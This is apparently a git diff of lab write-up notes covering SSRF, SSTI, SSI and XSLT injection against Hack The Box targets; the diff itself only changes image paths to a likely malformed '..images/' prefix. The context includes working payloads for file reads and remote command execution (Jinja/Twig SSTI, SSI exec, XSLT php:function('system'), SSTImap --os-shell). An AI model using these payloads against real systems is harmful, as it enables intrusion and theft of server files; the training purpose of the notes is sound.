@@ -62,7 +62,7 @@ Commonly abused schemes include:
 
 The target application provides an appointment scheduling feature.
 
-![Filtered output](.images/ssrf-discovery.png)
+![Filtered output](..images/ssrf-discovery.png)
 
 After scheduling an appointment and intercepting the request in `Burp Suite`, we identify a POST parameter named `dateserver`. Its value is a URL, indicating that the backend fetches data from a remote resource.
 
@@ -70,7 +70,7 @@ After scheduling an appointment and intercepting the request in `Burp Suite`, we
 dateserver=http://dateserver.htb/availability.php&date=2025-09-02
 ```
 
-![Filtered output](.images/ssrf-discovery2.png)
+![Filtered output](..images/ssrf-discovery2.png)
 
 To confirm SSRF, we supply a URL pointing to a server **under our control** and listen for incoming connections:
 
@@ -82,7 +82,7 @@ nc -lvnp 8001
 dateserver=http://10.10.15.190:8001/ssrf&date=2025-09-02
 ```
 
-![Filtered output](.images/ssrf-discovery3.png)
+![Filtered output](..images/ssrf-discovery3.png)
 
 The incoming request confirms that the application is vulnerable to SSRF.
 
@@ -100,7 +100,7 @@ The application responds with an error message:
 Failed to connect to 10.129.144.135 port 81 ...
 ```
 
-![Filtered output](.images/ssrf-discovery4.png)
+![Filtered output](..images/ssrf-discovery4.png)
 
 This message will be used as a filter during fuzzing.
 
@@ -122,7 +122,7 @@ The scan reveals three open internal ports:
 - `3306`
 - `8000`
 
-![Filtered output](.images/ssrf-discovery5.png)
+![Filtered output](..images/ssrf-discovery5.png)
 
 When directing the application to the service running on port `8000`, we successfully retrieve the flag:
 
@@ -134,7 +134,7 @@ dateserver=http://127.0.0.1:8000&date=2025-09-02
 HTB{911fc5badf7d65aed95380d536c270f8}
 ```
 
-![Filtered output](.images/ssrf-discovery6.png)
+![Filtered output](..images/ssrf-discovery6.png)
 
 ---
 
@@ -150,11 +150,11 @@ We request a directory that is unlikely to exist:
 dateserver=http://dateserver.htb/invalid&date=2025-09-02
 ```
 
-![Filtered output](.images/ssrf-discovery7.png)
+![Filtered output](..images/ssrf-discovery7.png)
 
 The server responds with a standard `404 Not Found` error. 
 
-![Filtered output](.images/ssrf-discovery8.png)
+![Filtered output](..images/ssrf-discovery8.png)
 
 This response will serve as our baseline and can be filtered out during fuzzing to reduce noise.
 
@@ -171,7 +171,7 @@ The scan reveals two valid internal endpoints:
 - `admin`
 - `availability`
 
-![Filtered output](.images/ssrf-discovery9.png)
+![Filtered output](..images/ssrf-discovery9.png)
 
 We direct the application to the `admin.php` endpoint via the SSRF parameter:
 
@@ -179,7 +179,7 @@ We direct the application to the `admin.php` endpoint via the SSRF parameter:
 dateserver=http://dateserver.htb/admin.php&date=2025-09-02
 ```
 
-![Filtered output](.images/ssrf-discovery10.png)
+![Filtered output](..images/ssrf-discovery10.png)
 
 The request succeeds, and the application returns the flag:
 
@@ -187,7 +187,7 @@ The request succeeds, and the application returns the flag:
 HTB{61ea58507c2b9da30465b9582d6782a1}
 ```
 
-![Filtered output](.images/ssrf-discovery11.png)
+![Filtered output](..images/ssrf-discovery11.png)
 
 ---
 
@@ -203,7 +203,7 @@ As an initial test, we attempt to read the standard Linux `/etc/passwd` file:
 dateserver=file:///etc/passwd&date=2025-09-02
 ```
 
-![Filtered output](.images/ssrf-lfi.png)
+![Filtered output](..images/ssrf-lfi.png)
 
 The server responds with the contents of `/etc/passwd`, confirming that:
 
@@ -211,7 +211,7 @@ The server responds with the contents of `/etc/passwd`, confirming that:
 - The server-side process has read access to local system files
 - The SSRF vulnerability can be leveraged for arbitrary file reads
 
-![Filtered output](.images/ssrf-lfi2.png)
+![Filtered output](..images/ssrf-lfi2.png)
 
 At this point, the impact of the vulnerability increases significantly. Depending on permissions and system configuration, this technique may allow attackers to read:
 
@@ -238,7 +238,7 @@ nc -lvnp 8001
 dateserver=htp://10.10.14.137:8001/ssrf&date=2026-01-01
 ```
 
-![Filtered output](.images/blind-ssrf.PNG)
+![Filtered output](..images/blind-ssrf.PNG)
 
 Receiving a connection confirms that the application is making outbound requests based on user-controlled input, and therefore is vulnerable to SSRF.
 
@@ -252,7 +252,7 @@ dateserver=http://127.0.0.1:80&date=2026-01-01
 Date is unavailable. Please choose a different date!
 ```
 
-![Filtered output](.images/blind-ssrf2.PNG)
+![Filtered output](..images/blind-ssrf2.PNG)
 
 However, when the application is pointed to a closed port, the response differs:
 
@@ -264,7 +264,7 @@ dateserver=http://127.0.0.1:81&date=2026-01-01
 Something went wrong!
 ```
 
-![Filtered output](.images/blind-ssrf3.PNG)
+![Filtered output](..images/blind-ssrf3.PNG)
 
 The difference in responses between open and closed ports indicates that, despite being blind, the SSRF vulnerability can still be exploited as an **oracle** to infer internal network state.
 
@@ -285,7 +285,7 @@ The scan reveals two open internal ports:
 - `80`
 - `5000`
 
-![Filtered output](.images/blind-ssrf4.PNG)
+![Filtered output](..images/blind-ssrf4.PNG)
 
 Although blind SSRF prevents direct response inspection, it can still be used to:
 
@@ -372,7 +372,7 @@ If the application is vulnerable to SSTI, injecting this string will typically c
 
 When injecting the probe string into the target application we receive an `Internal Server Error`.
 
-![Filtered output](.images/ssti0.PNG)
+![Filtered output](..images/ssti0.PNG)
 
 This increases the likelihood of the target being vulnerable to SSTI.
 
@@ -382,7 +382,7 @@ When interacting with the target application, we are prompted to enter a name:
 Enter your name:
 ```
 
-![Filtered output](.images/ssti1.png)
+![Filtered output](..images/ssti1.png)
 
 When entering a name, for example `Sam`, the name is reflected back to us:
 
@@ -390,13 +390,13 @@ When entering a name, for example `Sam`, the name is reflected back to us:
 Hi Sam!
 ```
 
-![Filtered output](.images/ssti2.png)
+![Filtered output](..images/ssti2.png)
 
 Because the response dynamically incorporates user input, we can infer that the application is rendering content using a template engine. This makes the application a strong candidate for SSTI testing.
 
 The following decision tree is commonly used to identify the underlying template engine based on payload behavior:
 
-![Filtered output](.images/ssti3.png)
+![Filtered output](..images/ssti3.png)
 
 We begin with a simple arithmetic expression commonly supported by many template engines:
 
@@ -410,7 +410,7 @@ The payload is reflected verbatim in the response:
 Hi ${7*7}!
 ```
 
-![Filtered output](.images/ssti4.png)
+![Filtered output](..images/ssti4.png)
 
 Since the expression was not evaluated, we follow the red path in the decision tree and test the next payload:
 
@@ -424,7 +424,7 @@ This time, the payload is evaluated by the server:
 Hi $49!
 ```
 
-![Filtered output](.images/ssti5.png)
+![Filtered output](..images/ssti5.png)
 
 Because the expression was executed, we proceed along the green path and test a payload that behaves differently depending on the template engine:
 
@@ -438,7 +438,7 @@ The result is again:
 Hi $49!
 ```
 
-![Filtered output](.images/ssti6.png)
+![Filtered output](..images/ssti6.png)
 
 This behavior allows us to distinguish between common engines:
 
@@ -467,7 +467,7 @@ A common first step is enumerating application configuration values. `Jinja` exp
 {{ config.items() }}
 ```
 
-![Filtered output](.images/jinja1.png)
+![Filtered output](..images/jinja1.png)
 
 `Jinja` templates provide access to internal Python objects. The following payload enumerates all available built-in functions. This output often includes functions such as `open`, `eval`, `exec`, and `__import__`, which can be leveraged for further exploitation:
 
@@ -475,7 +475,7 @@ A common first step is enumerating application configuration values. `Jinja` exp
 {{ self.__init__.__globals__.__builtins__ }}
 ```
 
-![Filtered output](.images/jinja2.png)
+![Filtered output](..images/jinja2.png)
 
 If the `open()` function is accessible, attackers can read arbitrary files from the server:
 
@@ -483,7 +483,7 @@ If the `open()` function is accessible, attackers can read arbitrary files from 
 {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
 
-![Filtered output](.images/jinja3.png)
+![Filtered output](..images/jinja3.png)
 
 This confirms file system access and significantly increases the impact of the vulnerability.
 
@@ -493,7 +493,7 @@ The Python `os` module provides functions such as `system()` and `popen()` that 
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
-![Filtered output](.images/jinja5.PNG)
+![Filtered output](..images/jinja5.PNG)
 
 Once command execution is confirmed, arbitrary commands can be executed, such as reading sensitive files:
 
@@ -501,7 +501,7 @@ Once command execution is confirmed, arbitrary commands can be executed, such as
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
 ```
 
-![Filtered output](.images/jinja4.png)
+![Filtered output](..images/jinja4.png)
 
 ---
 
@@ -515,7 +515,7 @@ A simple starting point when exploiting `Twig` SSTI is dumping contextual inform
 {{ _self }}
 ```
 
-![Filtered output](.images/twig.png)
+![Filtered output](..images/twig.png)
 
 This output can help confirm execution context and provide insight into the template structure.
 
@@ -527,7 +527,7 @@ One such filter is `file_excerpt`, which can be used to extract file contents.
 {{ "/etc/passwd"|file_excerpt(1,-1) }}
 ```
 
-![Filtered output](.images/twig2.png)
+![Filtered output](..images/twig2.png)
 
 This payload reads the contents of `/etc/passwd`, confirming local file inclusion via the template engine.
 
@@ -539,7 +539,7 @@ The following payload leverages Twig’s `filter()` function to call PHP’s `sy
 {{ ['cat /flag.txt'] | filter('system') }}
 ```
 
-![Filtered output](.images/twig3.png)
+![Filtered output](..images/twig3.png)
 
 In this case, the command is executed on the server, and its output is rendered in the response, confirming full RCE via `Twig` SSTI.
 
@@ -563,7 +563,7 @@ The following example demonstrates `SSTImap` analyzing a GET parameter to identi
 python3 sstimap.py -u http://94.237.60.55:49043/index.php?name=test
 ```
 
-![Filtered output](.images/twig4.png)
+![Filtered output](..images/twig4.png)
 
 In this case, `SSTImap` successfully identifies the template engine as `Twig` and reports several exploitable primitives, including `file read` and `file write` capabilities.
 
@@ -581,7 +581,7 @@ The `-S` flag can be used to execute arbitrary system commands on the target:
 python3 sstimap.py -u http://94.237.60.55:49043/index.php?name=test -S id
 ```
 
-![Filtered output](.images/twig5.png)
+![Filtered output](..images/twig5.png)
 
 This demonstrates remote code execution (RCE) via the SSTI vulnerability.
 
@@ -591,7 +591,7 @@ For deeper post-exploitation, `STImap` supports spawning an interactive shell us
 python3 sstimap.py -u http://94.237.60.55:49043/index.php?name=test --os-shell
 ```
 
-![Filtered output](.images/twig6.png)
+![Filtered output](..images/twig6.png)
 
 This allows direct interaction with the underlying operating system, confirming full compromise of the template rendering context.
 
@@ -694,7 +694,7 @@ When visiting the target application, we are prompted to enter a name:
 Enter your name:
 ```
 
-![Filtered output](.images/ssi.png)
+![Filtered output](..images/ssi.png)
 
 After submitting a name, we are redirected to a page with the `.shtml` extension:
 
@@ -702,7 +702,7 @@ After submitting a name, we are redirected to a page with the `.shtml` extension
 http://83.136.250.201:58497/page.shtml
 ```
 
-![Filtered output](.images/ssi2.png)
+![Filtered output](..images/ssi2.png)
 
 The `.shtml` extension suggests that SSI processing may be enabled. To test for an SSI vulnerability, we inject a basic SSI directive into the input field:
 
@@ -712,7 +712,7 @@ The `.shtml` extension suggests that SSI processing may be enabled. To test for 
 
 If the application is vulnerable, the directive is executed by the server. In this case, all environment variables are printed to the page, confirming the presence of an SSI injection vulnerability:
 
-![Filtered output](.images/ssi3.png)
+![Filtered output](..images/ssi3.png)
 
 To demonstrate impact, we leverage the `exec` directive to execute a system command and read the contents of `/etc/passwd`:
 
@@ -720,7 +720,7 @@ To demonstrate impact, we leverage the `exec` directive to execute a system comm
 <!--#exec cmd="cat /etc/passwd" -->
 ```
 
-![Filtered output](.images/ssi5.PNG)
+![Filtered output](..images/ssi5.PNG)
 
 This confirms that arbitrary command execution is possible through SSI injection.
 
@@ -841,7 +841,7 @@ An XSLT injection vulnerability occurs when user-controlled input is inserted in
 
 The target application displays basic information about various Hack The Box Academy modules.
 
-![Filtered output](.images/xslt.png)
+![Filtered output](..images/xslt.png)
 
 At the bottom of the page, the user is prompted to provide a name, which is then incorporated into the page header:
 
@@ -849,7 +849,7 @@ At the bottom of the page, the user is prompted to provide a name, which is then
 Please provide your name to customize your list:
 ```
 
-![Filtered output](.images/xslt2.png)
+![Filtered output](..images/xslt2.png)
 
 The supplied name is reflected at the top of the page:
 
@@ -857,7 +857,7 @@ The supplied name is reflected at the top of the page:
 Hi Sam, here are your favorite Academy modules:
 ```
 
-![Filtered output](.images/xslt3.png)
+![Filtered output](..images/xslt3.png)
 
 If the application stores module data in an XML document and renders it using XSLT, user-controlled input embedded into the XSL template may result in an XSLT injection vulnerability.
 
@@ -905,7 +905,7 @@ Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
 Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
 ```
 
-![Filtered output](.images/xslt5.png)
+![Filtered output](..images/xslt5.png)
 
 The response confirms that the application is vulnerable to XSLT injection and reveals that it uses the `libxslt` processor with XSLT version `1.0`.
 
@@ -923,7 +923,7 @@ If PHP function support is enabled (a common misconfiguration when using `libxsl
 <xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
 ```
 
-![Filtered output](.images/xslt6.png)
+![Filtered output](..images/xslt6.png)
 
 This confirms successful local file inclusion and further validates that PHP functions are accessible from within the XSLT context.
 
@@ -933,7 +933,7 @@ Since arbitrary PHP functions are allowed, we can escalate from file disclosure 
 <xsl:value-of select="php:function('system','ls -la')" />
 ```
 
-![Filtered output](.images/xslt7.PNG)
+![Filtered output](..images/xslt7.PNG)
 
 The command executes successfully on the server, resulting in full remote code execution via XSLT injection.
 
@@ -949,7 +949,7 @@ We are provided with the following target URL:
 
 Browsing to the application reveals a website for a food truck company.
 
-![Filtered output](.images/exploitation.png)
+![Filtered output](..images/exploitation.png)
 
 Interacting with the navigation links yields no visible results, suggesting that the frontend is either incomplete or relies heavily on backend-driven content. Inspecting the main page traffic reveals that the application issues three `POST` requests to an `API` endpoint. Each request corresponds to a different food truck location:
 
@@ -961,7 +961,7 @@ api=http://truckapi.htb/?id%3DFusionExpress02
 api=http://truckapi.htb/?id%3DFusionExpress03
 ```
 
-![Filtered output](.images/exploitation2.png)
+![Filtered output](..images/exploitation2.png)
 
 Each `POST` request contains two parameters, `id` and `location`:
 
@@ -973,7 +973,7 @@ Each `POST` request contains two parameters, `id` and `location`:
 {"id": "FusionExpress03", "location": "134 Main Street"}
 ```
 
-![Filtered output](.images/exploitation3.png)
+![Filtered output](..images/exploitation3.png)
 
 Since the application fetches data from a **remote URL**, it is a potential candidate for Server-Side Request Forgery (SSRF). To test this, we set up a local listener:
 
@@ -1005,13 +1005,13 @@ The supplied value is reflected directly in the response:
 {"id": "HACKED", "location": "321 Maple Lane"}
 ```
 
-![Filtered output](.images/exploitation4.png)
+![Filtered output](..images/exploitation4.png)
 
 This reflection suggests that the application dynamically renders the value of `id`, making it a viable candidate for SSTI testing.
 
 To fingerprint the template engine, we follow a standard SSTI decision tree:
 
-![Filtered output](.images/ssti3.png)
+![Filtered output](..images/ssti3.png)
 
 We begin with a common arithmetic payload:
 
@@ -1025,7 +1025,7 @@ The payload is reflected verbatim in the response:
 {"id": "${7*7}", "location": "134 Main Street"}
 ```
 
-![Filtered output](.images/exploitation5.png)
+![Filtered output](..images/exploitation5.png)
 
 Since the expression is not evaluated, we proceed along the "red" path and test an alternative syntax:
 
@@ -1039,7 +1039,7 @@ This time, the expression is evaluated server-side:
 {"id": "49", "location": "134 Main Street"}
 ```
 
-![Filtered output](.images/exploitation6.png)
+![Filtered output](..images/exploitation6.png)
 
 
 To further distinguish between template engines, we inject a payload that behaves differently depending on the engine:
@@ -1054,7 +1054,7 @@ The result remains:
 {"id": "49", "location": "134 Main Street"}
 ```
 
-![Filtered output](.images/exploitation7.png)
+![Filtered output](..images/exploitation7.png)
 
 This behavior allows us to distinguish between common engines:
 
@@ -1075,7 +1075,7 @@ The server responds with internal template metadata:
 {"id": "__string_template__0177c07c1ce875b2c81f5871e3da1c28", "location": "134 Main Street"}
 ```
 
-![Filtered output](.images/exploitation8.png)
+![Filtered output](..images/exploitation8.png)
 
 This confirms the presence of an exploitable SSTI vulnerability.
 
@@ -1091,7 +1091,7 @@ The server returns an error:
 Error (3): URL using bad/illegal format or missing URL
 ```
 
-![Filtered output](.images/exploitation9.png)
+![Filtered output](..images/exploitation9.png)
 
 This error is likely caused by improper handling of special characters, particularly the pipe (`|`). We URL-encode the payload and retry:
 
@@ -1101,4 +1101,4 @@ api=http://truckapi.htb/?id%3D{{%2b['cat%2b/etc/passwd']%2b|%2bfilter('system')%
 
 This time, the payload executes successfully, resulting in remote code execution and disclosure of `/etc/passwd`:
 
-![Filtered output](.images/exploitation10.png)
+![Filtered output](..images/exploitation10.png)
